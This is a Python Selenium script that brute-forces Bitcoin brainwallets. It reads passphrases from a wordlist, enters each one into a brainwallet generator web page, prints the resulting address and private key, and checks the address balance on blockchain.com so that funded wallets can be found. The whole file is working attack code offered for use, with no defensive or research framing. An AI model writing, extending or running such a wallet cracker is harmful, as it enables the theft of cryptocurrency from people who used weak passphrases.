from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import sys
import time
import random
import string

# using dictionary, for BruteForcing the used passphrases to create BTC Wallet
path = input('file full path: ')
file = open(path, "r")

# driver settings
sys.path.insert(0, '/usr/lib/chromium-browser/chromedriver')
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome('chromedriver', options=chrome_options)

# main code
url = "https://brainwalletx.github.io"
driver.get(url)
print("Strats in 10 sec...")
time.sleep(10)
driver.find_element(By.XPATH, '//*[@id="togglePass"]').click()
driver.find_element(By.XPATH, '//*[@id="toggleKeyCode"]').click()
for line in file:

    # brute forcing process
    pwd = str(line.strip())
    driver.find_element(By.XPATH, '//*[@id="pass"]').click()
    driver.find_element(By.XPATH, '//*[@id="pass"]').clear()
    driver.find_element(By.XPATH, '//*[@id="pass"]').send_keys(pwd)
    time.sleep(2)
    public = driver.find_element(By.XPATH, '//*[@id="addr"]').text

    # Address Details
    print("public: "+str(public))
    print("priv8 : "+driver.find_element(By.XPATH, '//*[@id="sec"]').text)

    # checking address balance
    url = "https://www.blockchain.com/btc/address/"+str(public)
    driver.execute_script("window.open('');")
    time.sleep(1)
    driver.switch_to.window(driver.window_handles[1])
    driver.get(url)
    balance = driver.find_element(
        By.XPATH, '//*[@id="__next"]/div[3]/div/div[3]/div[1]/div[1]/div[2]/div/div[6]/div[2]/span').text
    time.sleep(2)
    if str(balance) != "0.00000000 BTC":
        print("balance : "+str(balance))
    else:
        print("****Empty Balance****")
    driver.close()
    driver.switch_to.window(driver.window_handles[0])
